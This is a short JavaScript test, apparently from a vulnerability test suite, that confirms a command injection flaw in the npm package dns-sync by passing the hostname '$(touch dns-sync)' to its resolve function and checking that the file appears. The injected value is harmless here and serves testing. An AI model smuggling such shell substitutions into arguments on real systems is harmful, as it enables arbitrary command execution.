test("Command Injection in dns-sync", () => {
  expect.assertions(2);
  const dnsSync = require("dns-sync");
  const fs = require("fs");
  const path = "./dns-sync";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  dnsSync.resolve("$(touch dns-sync)");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
